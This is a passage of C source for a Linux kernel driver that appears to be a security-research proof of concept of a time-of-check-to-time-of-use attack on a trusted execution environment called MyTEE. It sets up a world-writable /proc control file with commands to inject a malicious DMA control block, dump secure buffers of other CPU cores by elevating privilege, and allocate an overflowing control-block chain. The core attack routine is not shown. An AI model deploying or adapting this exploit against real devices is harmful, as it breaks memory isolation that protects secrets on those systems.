               "*** YES - VULNERABILITY CONFIRMED! ***" : 
               "NO");
    
    if (attack_state.victim_copy_time > 0) {
        seq_printf(m, "Timing Measurements:\n");
        seq_printf(m, "  Victim DMA sequence: %llu ns\n", attack_state.victim_copy_time);
        seq_printf(m, "  Attacker inject: %llu ns\n\n", attack_state.attacker_inject_time);
    }
    
    if (attack_state.original_cb.info != 0) {
        seq_printf(m, "Original CB (before attack):\n");
        seq_printf(m, "  info: 0x%08x dst: 0x%08x\n\n",
                   attack_state.original_cb.info, attack_state.original_cb.dst);
    }
    
    if (attack_state.injection_done) {
        seq_printf(m, "Injected CB Content:\n");
        seq_printf(m, "  info:   0x%08x\n", attack_state.injected_cb.info);
        seq_printf(m, "  src:    0x%08x (bus)\n", attack_state.injected_cb.src);
        seq_printf(m, "  dst:    0x%08x (bus)\n", attack_state.injected_cb.dst);
        seq_printf(m, "  length: %d bytes\n", attack_state.injected_cb.length);
        seq_printf(m, "  next:   0x%08x\n\n", attack_state.injected_cb.next);
    }
    
    /* Dump first few CBs of target core */
    dump_secure_buffer(m, attack_state.target_core, 0, 5);
    
    seq_printf(m, "\nCommands:\n");
    seq_printf(m, "  echo attack > /proc/mytee_toctou    - Inject malicious CB\n");
    seq_printf(m, "  echo dump > /proc/mytee_toctou      - Dump secure buffer\n");
    seq_printf(m, "  echo reset > /proc/mytee_toctou     - Reset state\n");
    seq_printf(m, "  echo core=N > /proc/mytee_toctou    - Set target core (0-3)\n");
    seq_printf(m, "  echo index=N > /proc/mytee_toctou   - Set target CB index\n");
    
    return 0;
}

/*
 * Proc file write handler
 */
static ssize_t toctou_proc_write(struct file *file, const char __user *buffer,
                                  size_t count, loff_t *pos)
{
    char cmd[64];
    size_t len;
    int val;
    
    len = min(count, sizeof(cmd) - 1);
    if (copy_from_user(cmd, buffer, len))
        return -EFAULT;
    cmd[len] = '\0';
    
    /* Remove trailing newline */
    if (len > 0 && cmd[len-1] == '\n')
        cmd[len-1] = '\0';
    
    if (strcmp(cmd, "attack") == 0) {
        do_attack();
    } else if (strcmp(cmd, "reset") == 0) {
        attack_state.attack_triggered = 0;
        attack_state.injection_done = 0;
        attack_state.dma_executed = 0;
        attack_state.verify_result = 0;
        attack_state.attack_success = 0;
        memset(&attack_state.injected_cb, 0, sizeof(attack_state.injected_cb));
        pr_info("[TOCTOU] State reset\n");
    } else if (strcmp(cmd, "dump") == 0) {
#ifdef CONFIG_MYTEE
        struct dma_cb cb;
        int i, core;
        
        mytee_up_priv(MYTEE_UP_PRIV, 0, 0, 0);
        attack_state.secure_buf_base = (void __iomem *)SECURE_BUFFER_BASE_VIRT;
        
        for (core = 0; core < NUM_CORES; core++) {
            pr_info("[TOCTOU] Core %d first 3 CBs:\n", core);
            for (i = 0; i < 3; i++) {
                read_secure_cb(core, i, &cb);
                pr_info("  CB[%d]: info=0x%08x src=0x%08x dst=0x%08x\n",
                        i, cb.info, cb.src, cb.dst);
            }
        }
        
        mytee_down_priv(MYTEE_DOWN_PRIV, 0);
#endif
    } else if (sscanf(cmd, "core=%d", &val) == 1) {
        if (val >= 0 && val < NUM_CORES) {
            attack_state.target_core = val;
            pr_info("[TOCTOU] Target core set to %d\n", val);
        }
    } else if (sscanf(cmd, "index=%d", &val) == 1) {
        if (val >= 0 && val < MAX_CBS_PER_CORE) {
            attack_state.target_cb_index = val;
            pr_info("[TOCTOU] Target CB index set to %d\n", val);
        }
    } else {
        pr_info("[TOCTOU] Unknown command: %s\n", cmd);
    }
    
    return count;
}

static int toctou_proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, toctou_proc_show, NULL);
}

static const struct file_operations toctou_proc_fops = {
    .owner = THIS_MODULE,
    .open = toctou_proc_open,
    .read = seq_read,
    .write = toctou_proc_write,
    .llseek = seq_lseek,
    .release = single_release,
};

static int __init mytee_toctou_init(void)
{
    struct proc_dir_entry *entry;
    size_t cb_chain_size;
    
    pr_info("[TOCTOU] MyTEE TOCTOU Attack Driver loading\n");
    
#ifndef CONFIG_MYTEE
    pr_err("[TOCTOU] CONFIG_MYTEE not enabled! Driver will not function.\n");
#endif
    
    /* Initialize state */
    memset(&attack_state, 0, sizeof(attack_state));
    attack_state.target_core = 1;       /* Attack Core 1's buffer */
    attack_state.target_cb_index = 0;   /* First CB slot */
    atomic_set(&attack_state.sync_state, SYNC_STATE_IDLE);
    
    /* Allocate DMA-capable memory for payload */
    attack_state.payload_buf = kmalloc(PAGE_SIZE, GFP_KERNEL | GFP_DMA);
    if (!attack_state.payload_buf) {
        pr_err("[TOCTOU] Failed to allocate payload buffer\n");
        return -ENOMEM;
    }
    attack_state.payload_phys = virt_to_phys(attack_state.payload_buf);
    
    /* Allocate target buffer */
    attack_state.target_buf = kmalloc(PAGE_SIZE, GFP_KERNEL | GFP_DMA);
    if (!attack_state.target_buf) {
        pr_err("[TOCTOU] Failed to allocate target buffer\n");
        kfree(attack_state.payload_buf);
        return -ENOMEM;
    }
    attack_state.target_phys = virt_to_phys(attack_state.target_buf);
    
    /* Allocate CB chain for victim (129 CBs to cause overflow) */
    cb_chain_size = OVERFLOW_CB_COUNT * sizeof(struct dma_cb);
    attack_state.cb_chain = kmalloc(cb_chain_size, GFP_KERNEL | GFP_DMA);
    if (!attack_state.cb_chain) {
        pr_err("[TOCTOU] Failed to allocate CB chain\n");
        kfree(attack_state.target_buf);
        kfree(attack_state.payload_buf);
        return -ENOMEM;
    }
    attack_state.cb_chain_phys = virt_to_phys(attack_state.cb_chain);
    
    /* Create proc entry */
    entry = proc_create(PROC_NAME, 0666, NULL, &toctou_proc_fops);
    if (!entry) {
        pr_err("[TOCTOU] Failed to create proc entry\n");
        kfree(attack_state.cb_chain);
        kfree(attack_state.target_buf);
        kfree(attack_state.payload_buf);
        return -ENOMEM;
    }
    
    pr_info("[TOCTOU] Driver loaded successfully\n");
    pr_info("[TOCTOU] Use: echo attack > /proc/%s\n", PROC_NAME);
    pr_info("[TOCTOU] Payload: phys=0x%llx\n", (u64)attack_state.payload_phys);
    pr_info("[TOCTOU] Target:  phys=0x%llx\n", (u64)attack_state.target_phys);
    pr_info("[TOCTOU] CB Chain: phys=0x%llx (%d CBs)\n", 
            (u64)attack_state.cb_chain_phys, OVERFLOW_CB_COUNT);
    
    return 0;
}

static void __exit mytee_toctou_exit(void)
{
    remove_proc_entry(PROC_NAME, NULL);
    
    /* Stop any running threads */
    attack_state.stop_threads = 1;
    wmb();
    msleep(100);
    
    if (attack_state.dma_base)
        iounmap(attack_state.dma_base);
    if (attack_state.cb_chain)
        kfree(attack_state.cb_chain);
    if (attack_state.target_buf)
        kfree(attack_state.target_buf);
    if (attack_state.payload_buf)
        kfree(attack_state.payload_buf);
    
    pr_info("[TOCTOU] Driver unloaded\n");
}

/* Use late_initcall for built-in driver to ensure system is ready */
late_initcall(mytee_toctou_init);

/* Built-in drivers don't need module macros, but keep for documentation */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Research");
MODULE_DESCRIPTION("MyTEE TOCTOU Attack - Using mytee_up_priv API (built-in)");

